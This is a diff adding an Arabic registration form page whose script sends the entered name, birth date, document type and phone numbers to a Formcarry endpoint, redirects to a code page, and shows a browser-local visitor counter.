@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>نموذج التسجيل</title>
+  <style>
+    body {
+      background: linear-gradient(white, #ddd);
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    form {
+      background: #f5f5f5;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 500px;
+      margin: auto;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+    input, select {
+      width: 100%;
+      padding: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px;
+      width: 100%;
+      background-color: gray;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    .counter {
+      text-align: center;
+      margin-top: 20px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="userForm">
+    <h2 style="text-align:center;">نموذج التسجيل</h2>
+
+    <label>الاسم الثلاثي</label>
+    <input type="text" name="full_name" required>
+
+    <label>اللقب</label>
+    <input type="text" name="last_name" required>
+
+    <label>تاريخ الميلاد</label>
+    <input type="date" name="birth_date" required>
+
+    <label>الجنس</label>
+    <select name="gender" required>
+      <option value="ذكر">ذكر</option>
+      <option value="أنثى">أنثى</option>
+    </select>
+
+    <label>المستوى الدراسي</label>
+    <select name="education_level" required>
+      <option value="إعدادي">إعدادي</option>
+      <option value="ثانوي">ثانوي</option>
+      <option value="جامعي">جامعي</option>
+    </select>
+
+    <label>نوع المستند</label>
+    <select name="document_type" required>
+      <option value="جواز سفر">جواز سفر</option>
+      <option value="بطاقة شخصية">بطاقة شخصية</option>
+    </select>
+
+    <label>رقم الهاتف</label>
+    <input type="tel" name="phone" required>
+
+    <label>رقم هاتف احتياطي</label>
+    <input type="tel" name="alt_phone" required>
+
+    <button type="submit">إرسال</button>
+  </form>
+
+  <div class="counter">
+    عدد الزوار: <span id="visitorCount">0</span>
+  </div>
+
+  <script>
+    // عداد الزوار المحلي
+    if (localStorage.visitorCount) {
+      localStorage.visitorCount = Number(localStorage.visitorCount) + 1;
+    } else {
+      localStorage.visitorCount = 1;
+    }
+    document.getElementById("visitorCount").textContent = localStorage.visitorCount;
+
+    // إرسال البيانات إلى Formcarry والانتقال لصفحة الكود
+    const form = document.getElementById('userForm');
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const formData = new FormData(form);
+
+      fetch('https://formcarry.com/s/12UxdOsTbaW', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          Accept: 'application/json'
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "code.html";
+        } else {
+          alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+        }
+      })
+      .catch(error => {
+        alert("فشل الاتصال بالخادم.");
+        console.error(error);
+      });
+    });
+  </script>
+</body>
+</html>
